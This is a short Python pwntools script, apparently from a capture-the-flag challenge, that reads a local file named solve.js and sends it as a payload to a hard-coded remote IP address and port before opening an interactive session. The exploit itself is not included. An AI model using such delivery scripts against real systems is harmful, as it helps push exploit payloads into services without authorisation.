#!/usr/bin/env python3

from pwn import *

with open("./solve.js", "rb") as f:
    payload = f.read()

io = remote("13.201.224.182", 32598)

io.sendline(str(len(payload)).encode())
io.send(payload)

io.interactive()
